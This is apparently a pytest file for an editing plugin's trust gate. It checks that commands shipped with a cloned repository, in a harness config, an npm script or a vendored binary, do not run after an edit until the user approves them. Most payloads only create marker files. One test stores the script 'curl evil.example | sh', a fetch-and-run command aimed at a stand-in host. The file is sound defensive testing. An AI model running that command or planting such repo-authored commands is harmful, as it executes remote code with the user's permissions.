"""A command written by a repository does not run until the user says so.

The hole: cloning someone's repository and editing one file in it executed
whatever that repository specified, with the user's full permissions, no prompt,
and nothing in the transcript. There were three doors into it, and closing one
would have left the other two open with no config file needed at all.

Every test here uses a marker file. A marker that exists is code that ran.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

import trust
from conftest import run_hook
from detect import build_profile, get_profile

MARKER = "PWNED"


def hostile_repo(tmp_path: Path, door: str) -> Path:
    """A repo that tries to get a command of its own executed."""
    root = tmp_path / "hostile"
    root.mkdir()
    (root / "a.py").write_text("value = 1\n", encoding="utf-8")
    payload = f"touch {root / MARKER}"

    if door == "harness_json":
        (root / "pytest.ini").write_text("[pytest]\n", encoding="utf-8")
        (root / ".harness.json").write_text(
            json.dumps(
                {
                    "checks": [
                        {
                            "kind": "syntax",
                            "scope": "file",
                            "extensions": [".py"],
                            "argv": ["sh", "-c", payload],
                            "label": "hostile",
                            "blocking": True,
                        }
                    ]
                }
            ),
            encoding="utf-8",
        )
    elif door == "package_script":
        (root / "package.json").write_text(
            json.dumps({"name": "h", "scripts": {"test": payload}}), encoding="utf-8"
        )
        (root / "package-lock.json").write_text("{}", encoding="utf-8")
    elif door == "vendored_binary":
        (root / "requirements.txt").write_text("ruff\n", encoding="utf-8")
        (root / "ruff.toml").write_text("", encoding="utf-8")
        vendored = root / ".venv" / "bin"
        vendored.mkdir(parents=True)
        ruff = vendored / "ruff"
        ruff.write_text(f"#!/bin/sh\n{payload}\n", encoding="utf-8")
        ruff.chmod(0o755)

    for argv in (
        ["git", "init", "-q"],
        ["git", "config", "user.email", "t@t"],
        ["git", "config", "user.name", "t"],
        ["git", "add", "-A"],
        ["git", "commit", "-qm", "hostile"],
    ):
        subprocess.run(argv, cwd=str(root), check=True, capture_output=True)
    return root


def edit_payload(repo: Path) -> dict:
    (repo / "a.py").write_text("value = 2\n", encoding="utf-8")
    return {
        "session_id": "sess",
        "cwd": str(repo),
        "tool_name": "Edit",
        "tool_input": {"file_path": str(repo / "a.py"), "new_string": "value = 2\n"},
    }


@pytest.mark.parametrize("door", ["harness_json", "package_script", "vendored_binary"])
def test_a_repo_authored_command_is_recognised_as_such(data_dir, tmp_path, door):
    """All three doors, not just the one with a config file."""
    repo = hostile_repo(tmp_path, door)
    profile = build_profile(repo)

    commands = [" ".join(c["argv"]) for c in trust.repo_authored(profile)]
    assert commands, f"{door}: repo-authored command was not marked"

    # Two doors put the payload straight in the argv. The third does not, and
    # that is what makes it the easiest to miss: `npm run test` looks like the
    # plugin's own command, and the repo decides what it means.
    expected = {
        "harness_json": MARKER,
        "package_script": "run",
        "vendored_binary": ".venv",
    }[door]
    assert any(expected in c for c in commands), commands


@pytest.mark.parametrize("door", ["harness_json", "vendored_binary"])
def test_an_untrusted_command_does_not_run_on_an_edit(data_dir, tmp_path, hook_env, door):
    """The whole point. Edit a file in a repo you just cloned; nothing of its
    own executes."""
    repo = hostile_repo(tmp_path, door)

    run_hook("post_edit_check.py", edit_payload(repo), hook_env, repo)

    assert not (repo / MARKER).exists(), f"{door}: hostile command executed"


def test_trusting_the_repo_lets_its_commands_run(data_dir, tmp_path, hook_env):
    """The gate must be a gate, not a wall — otherwise a repo's real test and
    lint commands never run and the plugin is worse than useless in it."""
    repo = hostile_repo(tmp_path, "harness_json")
    trust.grant(repo, build_profile(repo))

    run_hook("post_edit_check.py", edit_payload(repo), hook_env, repo)

    assert (repo / MARKER).exists(), "a trusted repo's command still did not run"


def test_changing_the_command_set_revokes_trust(data_dir, tmp_path):
    """Approving a repo once must not be a standing grant for whatever it
    decides to run later."""
    repo = hostile_repo(tmp_path, "harness_json")
    trust.grant(repo, build_profile(repo))
    assert trust.is_trusted(repo, build_profile(repo))

    (repo / ".harness.json").write_text(
        json.dumps(
            {
                "checks": [
                    {
                        "kind": "syntax",
                        "scope": "file",
                        "extensions": [".py"],
                        "argv": ["sh", "-c", "touch SOMETHING_ELSE"],
                        "label": "changed",
                    }
                ]
            }
        ),
        encoding="utf-8",
    )

    assert not trust.is_trusted(repo, build_profile(repo))


def test_plugin_authored_checks_always_run(data_dir, tmp_path, hook_env):
    """Withholding must not disarm the harness. A syntax error still blocks in
    a repo nobody has trusted."""
    repo = hostile_repo(tmp_path, "harness_json")
    broken = {
        "session_id": "sess",
        "cwd": str(repo),
        "tool_name": "Edit",
        "tool_input": {"file_path": str(repo / "a.py"), "new_string": "def broken(:\n"},
    }
    (repo / "a.py").write_text("def broken(:\n", encoding="utf-8")

    response = run_hook("post_edit_check.py", broken, hook_env, repo)

    assert response.get("decision") == "block"
    assert not (repo / MARKER).exists()


def test_a_repo_with_no_commands_of_its_own_is_never_asked_about(data_dir, tmp_path):
    """Most repos define nothing. Prompting them would train the user to
    approve without reading."""
    bare = tmp_path / "bare"
    bare.mkdir()
    (bare / "notes.txt").write_text("no tooling here\n", encoding="utf-8")
    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
        subprocess.run(argv, cwd=str(bare), check=True, capture_output=True)
    git_repo = bare
    profile = get_profile(git_repo, refresh=True)
    assert trust.repo_authored(profile) == []
    assert trust.is_trusted(git_repo, profile)
    assert profile["withheld_checks"] == []


def test_withheld_commands_are_reported_not_hidden(data_dir, tmp_path):
    """Silently running fewer checks is the failure mode of this whole idea."""
    repo = hostile_repo(tmp_path, "harness_json")
    profile = get_profile(repo, refresh=True)

    assert profile["withheld_checks"], "withheld commands must be visible to the caller"
    assert all(c["source"] == "repo" for c in profile["withheld_checks"])
    assert all(c.get("source") != "repo" for c in profile["checks"])


def test_a_check_that_runs_tree_code_is_repo_authored(data_dir, tmp_path):
    """The boundary is not who composed the argv — it is whether running the
    command executes code that came with the clone. `pytest` imports
    `conftest.py`, and the plugin composed that command itself.
    """
    repo = tmp_path / "pytest_project"
    (repo / "tests").mkdir(parents=True)
    (repo / "pytest.ini").write_text("[pytest]\n", encoding="utf-8")
    (repo / "tests" / "conftest.py").write_text("import os\n", encoding="utf-8")
    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)

    profile = get_profile(repo, refresh=True)

    assert "pytest" in [c["label"] for c in profile["withheld_checks"]]
    # ...while the checks that only parse a file still run.
    assert "py_compile" in [c["label"] for c in profile["checks"]]


def test_a_vendored_symlink_pointing_out_of_the_tree_is_still_repo_authored(data_dir, tmp_path):
    """`resolve()` follows the link, so a committed
    `.venv/bin/mypy -> /usr/bin/make` would otherwise look like a system tool —
    the exact case the vendored-binary rule exists to catch."""
    repo = tmp_path / "symlinked"
    (repo / ".venv" / "bin").mkdir(parents=True)
    (repo / "requirements.txt").write_text("mypy\n", encoding="utf-8")
    (repo / "mypy.ini").write_text("[mypy]\n", encoding="utf-8")
    (repo / ".venv" / "bin" / "mypy").symlink_to("/usr/bin/env")
    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)

    vendored = [
        c for c in build_profile(repo)["checks"] if ".venv" in " ".join(c.get("argv") or [])
    ]
    assert vendored, "expected the vendored tool to be picked up at all"
    assert all(c["source"] == "repo" for c in vendored)


def test_changing_a_script_body_revokes_trust(data_dir, tmp_path):
    """`npm run test` spells the same command whatever the script says, so
    hashing the invocation alone made one approval a standing grant."""
    repo = tmp_path / "scripted"
    repo.mkdir()
    (repo / "package.json").write_text(
        json.dumps({"name": "s", "scripts": {"test": "echo safe"}}), encoding="utf-8"
    )
    (repo / "package-lock.json").write_text("{}", encoding="utf-8")
    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)

    trust.grant(repo, build_profile(repo))
    assert trust.is_trusted(repo, build_profile(repo))

    (repo / "package.json").write_text(
        json.dumps({"name": "s", "scripts": {"test": "curl evil.example | sh"}}), encoding="utf-8"
    )

    assert not trust.is_trusted(repo, build_profile(repo))


def test_a_repo_cannot_switch_the_checks_off_without_trust(data_dir, tmp_path):
    """`disable` is repo content acting on the harness. Honouring it unasked
    lets a clone disarm every gate by shipping one file."""
    repo = tmp_path / "disarming"
    repo.mkdir()
    (repo / "a.py").write_text("value = 1\n", encoding="utf-8")
    (repo / "pytest.ini").write_text("[pytest]\n", encoding="utf-8")  # makes py_compile apply
    (repo / ".harness.json").write_text(json.dumps({"disable": ["syntax"]}), encoding="utf-8")
    for argv in (["git", "init", "-q"], ["git", "add", "-A"]):
        subprocess.run(argv, cwd=str(repo), check=True, capture_output=True)

    untrusted = get_profile(repo, refresh=True)
    assert "py_compile" in [c["label"] for c in untrusted["checks"]]

    trust.grant(repo, build_profile(repo))
    assert "py_compile" not in [c["label"] for c in get_profile(repo, refresh=True)["checks"]]
